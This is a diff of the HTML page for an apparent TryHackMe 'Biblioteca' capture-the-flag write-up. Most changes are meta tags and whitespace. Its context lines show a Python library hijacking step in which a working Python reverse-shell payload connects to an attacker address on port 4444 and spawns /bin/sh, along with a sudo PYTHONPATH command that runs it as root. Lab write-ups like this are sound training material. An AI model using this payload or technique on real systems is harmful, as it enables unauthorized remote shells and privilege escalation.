@@ -8,7 +8,6 @@
 <meta name="description" content="https://tryhackme.com/room/biblioteca
 User Flag First, we start by enumerating the ports and services.
 In the print below I have already set the ports to 22 and 8000 because I found out that they were open in a regular scan without any nmap flags.
-
 I access the website and see that there is a login page. I try to create a user in the Sign-Up link to see what it looks like in there, but there is nothing interesting there." />
 <meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
@@ -46,15 +45,9 @@ I access the website and see that there is a login page. I try to create a user 
 <meta itemprop="description" content="https://tryhackme.com/room/biblioteca
 User Flag First, we start by enumerating the ports and services.
 In the print below I have already set the ports to 22 and 8000 because I found out that they were open in a regular scan without any nmap flags.
-
-I access the website and see that there is a login page. I try to create a user in the Sign-Up link to see what it looks like in there, but there is nothing interesting there.">
-<meta itemprop="datePublished" content="2022-05-23T20:20:50-03:00" />
+I access the website and see that there is a login page. I try to create a user in the Sign-Up link to see what it looks like in there, but there is nothing interesting there."><meta itemprop="datePublished" content="2022-05-23T20:20:50-03:00" />
 <meta itemprop="dateModified" content="2022-05-23T20:20:50-03:00" />
-<meta itemprop="wordCount" content="494">
-<meta itemprop="image" content="https://b1d0ws.github.io/"/>
-
-
-
+<meta itemprop="wordCount" content="494"><meta itemprop="image" content="https://b1d0ws.github.io/"/>
 <meta itemprop="keywords" content="" />
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://b1d0ws.github.io/"/>
@@ -63,7 +56,6 @@ I access the website and see that there is a login page. I try to create a user 
 <meta name="twitter:description" content="https://tryhackme.com/room/biblioteca
 User Flag First, we start by enumerating the ports and services.
 In the print below I have already set the ports to 22 and 8000 because I found out that they were open in a regular scan without any nmap flags.
-
 I access the website and see that there is a login page. I try to create a user in the Sign-Up link to see what it looks like in there, but there is nothing interesting there."/>
 
 
@@ -73,13 +65,12 @@ I access the website and see that there is a login page. I try to create a user 
 <meta property="og:description" content="https://tryhackme.com/room/biblioteca
 User Flag First, we start by enumerating the ports and services.
 In the print below I have already set the ports to 22 and 8000 because I found out that they were open in a regular scan without any nmap flags.
-
 I access the website and see that there is a login page. I try to create a user in the Sign-Up link to see what it looks like in there, but there is nothing interesting there." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://b1d0ws.github.io/write-ups/biblioteca-thm/" />
-<meta property="og:image" content="https://b1d0ws.github.io/"/>
+<meta property="og:url" content="https://b1d0ws.github.io/write-ups/biblioteca-thm/" /><meta property="og:image" content="https://b1d0ws.github.io/"/><meta property="article:section" content="write-ups" />
 <meta property="article:published_time" content="2022-05-23T20:20:50-03:00" />
 <meta property="article:modified_time" content="2022-05-23T20:20:50-03:00" /><meta property="og:site_name" content="b1d0ws" />
+
 
 
 
@@ -199,12 +190,12 @@ Here we can do something that is called Python Library Hijacking. Basically, we 
 <p><img src="/biblioteca/libtmp.png" alt="biblioteca"></p>
 <p><br>
 Now we can edit it and insert a python reverse shell payload with our tun0 address.</p>
-<pre><code>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.2.117.185&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);
+<pre tabindex="0"><code>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.2.117.185&#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);
 </code></pre><p><img src="/biblioteca/payloadLib.png" alt="biblioteca"></p>
 <p><br>
 We need to execute the python file with the PYTHONPATH argument, to tell where python will search for the libraries included in the hasher.py. When we execute the hasher.py, it will call the library hashlib and since there is this playload in the library file, the reverse shell will be popped in our listener.</p>
 <p>Remember to set your listener before executing the command.</p>
-<pre><code>sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/hazel/hasher.py
+<pre tabindex="0"><code>sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/hazel/hasher.py
 </code></pre><p><img src="/biblioteca/comando.png" alt="biblioteca"></p>
 <p><br>
 Finally we obtain our reverse shell and just cat root.txt for the second flag.</p>
@@ -237,7 +228,7 @@ Finally we obtain our reverse shell and just cat root.txt for the second flag.</
 
 
 
-<script type="text/javascript" src="/bundle.min.ace63d93098bf623f7c286a9084a4c22bfc482944c734f87fe0b685c7c6c7fa0ad2edb028c3b4b60d3343720c8ab490b320ad7f8edf4f6e9a6b898fc529057a9.js" integrity="sha512-rOY9kwmL9iP3woapCEpMIr/EgpRMc0&#43;H/gtoXHxsf6CtLtsCjDtLYNM0NyDIq0kLMgrX&#43;O309ummuJj8UpBXqQ=="></script>
+<script type="text/javascript" src="/bundle.min.feebdc8d801e3fb1791305e362b6d11557f029604dd5b3c27e2686bc88787ee90ae1ccf0afe81bd7d959d7617cfe1fc73062aa82b4e1fa830d6941193d2cbddf.js" integrity="sha512-/uvcjYAeP7F5EwXjYrbRFVfwKWBN1bPCfiaGvIh4fukK4czwr&#43;gb19lZ12F8/h/HMGKqgrTh&#43;oMNaUEZPSy93w=="></script>
 
 
 
